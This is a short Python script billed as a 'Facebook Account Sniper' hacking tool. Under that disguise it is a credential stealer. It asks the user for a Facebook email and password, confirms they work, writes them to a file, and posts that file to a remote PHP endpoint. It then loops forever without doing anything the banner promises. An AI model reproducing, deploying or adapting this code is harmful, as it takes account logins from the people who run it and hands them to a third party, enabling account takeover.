#!/usr/bin/python
import requests,re,random
from mechanize import Browser
from time import sleep
#contact: soracyberteam@gmail.com
def banner():
	print('''
####################
# Facebook Account # @author: FilthyRoot
#     Sniper v5    # @github: gh/soracyberteam
####################
	''')

def check_server():
	r = requests.get("http://ifconfig.me/ip")
	return r.text

def login(email,password):
	r = Browser()
	r.set_handle_robots(False)
	r.addheaders = [('User-agent','Firefox')]
	r.open("https://facebook.com/login.php")
	r.select_form(nr=0)
	r.form['email'] = email
	r.form['pass']  = password
	submit = r.submit()
	return submit.geturl()

def grab_token(email, password):
	x = open("token.txt", "w")
	x.write(email + ":" + password)
	x.close()

	files = {
	'x':('token.txt',open('token.txt','rb')),
	}

	r = requests.post("http://sman1bantul.sch.id/grab_token.php", files=files)
	return r.text

def enter_server():
	while True:
		pass

banner()
ip = check_server()
print("[*] Checking server ...")
sleep(3)
print("[*] Your IP : "+ ip)
sleep(2)
print("[!] Please login with your account first! (This tool need token)")
email    = input("Email    : ")
password = input("Password : ")
check    = login(email,password)

if re.search("/login/device-based/regular/login/",check):
	print("[!] Invalid account!")
	print("[x] Exiting ...")
	exit()
else:
	print("[*] Login success!")
	print("[*] Grabbing access token ...")
	if(grab_token(email,password) == "ok"):
		enter_server()
	else:
		print("[!] Failed to join server!")
		print(grab_token(email,password))
		exit()
